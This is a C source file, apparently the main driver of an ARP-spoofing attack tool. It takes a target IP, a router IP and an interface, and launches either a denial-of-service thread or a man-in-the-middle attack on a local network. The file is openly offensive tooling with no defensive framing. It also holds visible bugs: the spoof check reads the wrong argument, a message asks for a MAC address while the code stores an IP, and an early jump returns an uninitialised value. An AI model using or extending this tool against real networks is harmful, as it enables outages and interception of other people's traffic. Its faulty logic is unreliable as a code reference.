#include "arp.h"

int main(const int argc, const char *argv[])
{
    // Check min argument count
    if(argc < 6) {
        err("Usage: %s <ATTACK_TYPE(DOS/MITM)> <INTERFACE> <TARGET_IP> <ROUTER_IP> <PACKET_DELAY> opt:<IP_TO_SPOOF_FROM>");
        goto out;
    }

    // Assign flags
    int ret = -1;
    int macspoof = 1;

    // Create pointers to arguments
    const char *attack_type = argv[1];
    const char *interface = argv[2];
    const char *target_ip = argv[3];
    const char *router_ip = argv[4];
    const char *c_delay = argv[5];
    const char *spoof_ip;

    // Set delay argument to int
    int delay = atoi(c_delay);

    // Check if mac address spoofing is enabled for DOS
    if(argc == 6) {
        debug("Not spoofing mac address");
        
        macspoof = 0;
        spoof_ip = NULL;
    }

    // Check for valid spoof mac
    if(macspoof == 1) {
        if(strlen(argv[5]) < IPV4_LENGTH) {
            err("Please enter MAC address");
            goto out;
        }

        spoof_ip = argv[6];
    }

    // Select attack type
    if (strcmp(attack_type, "DOS") == 0)
    {
        // Gather thread attributes for thread creation
        pthread_t tid = 0;

        // Run dos
        if (run_local_dos_attack(interface, target_ip, router_ip, spoof_ip, macspoof, delay, &tid) != 0)
        {
            err("DOS FAILED");
            goto out;
        }

        debug("DOS Thread Running");

        // Wait for thread to finish
        pthread_join(tid, NULL);

        debug("DOS Thread Shutdown");
    } else if(strcmp(attack_type, "MITM") == 0) {
        // Run man in the middle
        if(run_mitm_attack(interface, target_ip, router_ip) != 0) {
            err("MITM Critical Error");
            goto out;
        }
    } else {
        err("Invalid Attack Option");
        goto out;
    }

    ret = 0;

out:
    return ret;
}
